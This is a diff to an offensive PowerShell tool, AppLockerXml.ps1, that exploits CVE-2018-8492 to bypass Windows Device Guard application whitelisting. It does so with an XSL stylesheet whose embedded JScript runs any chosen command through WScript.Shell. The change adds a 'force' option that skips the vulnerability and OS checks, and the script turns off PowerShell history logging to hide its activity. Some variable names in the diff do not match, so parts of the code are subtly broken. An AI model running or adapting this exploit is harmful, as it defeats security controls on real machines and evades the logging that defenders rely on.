@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (19042) x64 bits
    Required Dependencies: Msxml2 -com Object {native}
    Optional Dependencies: none
-   PS cmdlet Dev version: v1.1.8
+   PS cmdlet Dev version: v1.1.9
 
 .DESCRIPTION
    AppLockerXml.ps1 module Checks\Exploits CVE-2018-8492 security bypass vulnerability in
@@ -45,6 +45,10 @@
    Checks if PS $ExecutionContext its set to 'ConstrainedLanguage'. If 'Constrained'..
    Execute 'cmd.exe' through CVE-2018-8492 XML bypass technic and close it after 5 seconds!
 
+.EXAMPLE
+   PS C:\> .\AppLockerXml.ps1 -Action XmlBypass -Execute "calc.exe" -Verb True
+   Skip cmdlet vulnerability tests to execute 'calc.exe' through XML bypass technic!
+
 .INPUTS
    None. You cannot pipe objects into AppLockerXml.ps1
 
@@ -73,13 +77,14 @@
 
 ## Non-Positional cmdlet named parameters
 [CmdletBinding(PositionalBinding=$false)] param(
-   [string]$Execute="cmd.exe",
+   [string]$Execute='cmd.exe',
    [string]$TimeOpen='false',
-   [string]$Action="false"
+   [string]$Action='false',
+   [string]$Verb='false'
 )
 
 
-Write-Host ""
+## Global cmdlet variable declarations!
 $OSMajor = [environment]::OSVersion.Version.Major
 ## Disable Powershell Command Logging for current session.
 Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
@@ -91,7 +96,7 @@ If($Action -ieq "False"){## [error] none parameters sellected by cmdlet user!
    exit ## Exit @AppLockerXml
 }
 
-If($OSMajor -NotMatch '(10|2016|2019)'){## [error] wrong OS flavor detected!
+If($OSMajor -NotMatch '(10|2016|2019)' -and $Verb -iNotMatch '^(True)$'){## [error] wrong OS flavor detected!
    Write-Host "[error] This cmdlet requires 'Windows (10|2016|2019) build' to work!" -ForeGroundColor Red -BackGroundColor Black
    Start-Sleep -Seconds 2;Get-Help .\AppLockerXml.ps1 -Full
    exit ## Exit @AppLockerXml
@@ -118,7 +123,7 @@ $CDATA = @("<?xml version=`"1.0`"?>
 <output method=`"text`"/>
 	<ms:script implements-prefix=`"user`" language=`"JScript`">
 	<![CDATA[
-	var r = new ActiveXObject(`"WScript.Shell`").Run(`"$Execute`");
+	   var r = new ActiveXObject(`"WScript.Shell`").Run(`"$Execute`");
 	]]> </ms:script>
 </stylesheet>")
 
@@ -127,12 +132,16 @@ If($Action -ieq "XmlBypass"){
 
    <#
    .SYNOPSIS
-      Author: @bohops|@r00t-3xp10it
+      Author: @bohops (disclosure) | @r00t-3xp10it
       Helper - Application Whitelisting Bypass {XML}
 
    .DESCRIPTION
       This function bypass Windows Device Guard Application Whitelisting Execution
       through CVE-2018-8492 @bohops XML COM object transformation bypass technic!
+
+   .NOTES
+      If sellected -verb 'force' @argument, then cmdlet skip's vulnerability
+      tests and forceblly executes the -execute 'application.exe' cmdline!
       
    .OUTPUTS
       [INFO] Windows Device Guard!
@@ -146,31 +155,42 @@ If($Action -ieq "XmlBypass"){
    #>
 
 
+   $CML = $null;$AOF = $null
    ## Local function variable declarations
    If($TimeOpen -ieq 'false'){$TimeOpen = '1'}
    $CVEState = $ExecutionContext.SessionState.LanguageMode
 
 
    ## Build Output Table
-   Write-Host "`n[INFO] Windows Device Guard!" -ForegroundColor Green
+   Write-Host "`n`n[INFO] Windows Device Guard!" -ForegroundColor Green
+   If($Verb -ieq 'True'){$AOF = "force execution"}Else{$AOF = "true"}
    Write-Host "----------------------------------------"
-   Write-Host "AffectedOSflavor    : true"
+   Write-Host "AffectedOSflavor    : $AOF"
 
 
-   ## Check ExecutionContext vulnerability state!
-   # If($CVEState -iNotMatch '^(FullLanguage)$'){
-   If($CVEState -iNotMatch '^(ConstrainedLanguage)$'){
-      Write-Host "ConstrainedLanguage : disabled" -ForegroundColor Yellow
-      Write-Host "";Start-Sleep -Milliseconds 700
-      Write-Host "[XML] CVE-2018-8492 bypass!"
-      Write-Host "----------------------------------------";Start-Sleep -Milliseconds 700
-      Write-Host "ScanResults          : none CLM restrictions found active!" -ForegroundColor Green -BackGroundColor Black
-      Write-Host "";exit ## Exit @AppLockerXml
+   If(-not($Verb -ieq 'True')){
+
+      $CML = "enabled"
+      ## Check ExecutionContext vulnerability state!
+      # If($CVEState -iNotMatch '^(FullLanguage)$'){
+      If($CVEState -iNotMatch '^(ConstrainedLanguage)$'){
+         Write-Host "ConstrainedLanguage : disabled" -ForegroundColor Yellow
+         Write-Host "";Start-Sleep -Milliseconds 700
+         Write-Host "[XML] CVE-2018-8492 bypass!"
+         Write-Host "----------------------------------------";Start-Sleep -Milliseconds 700
+         Write-Host "ScanResults          : none CLM restrictions found active!" -ForegroundColor Green -BackGroundColor Black
+         Write-Host "";exit ## Exit @AppLockerXml
+      }
+
+   }Else{
+   
+      $CLM = "force execution"
+   
    }
 
 
    ## Apend Data to Output Table
-   Write-Host "ConstrainedLanguage : enabled"
+   Write-Host "ConstrainedLanguage : $CLM"
    Write-Host "ExecuteAppl         : $Pars"
    Write-Host "ApplTimeOpen        : $TimeOpen seconds`n"
    Start-Sleep -Milliseconds 700
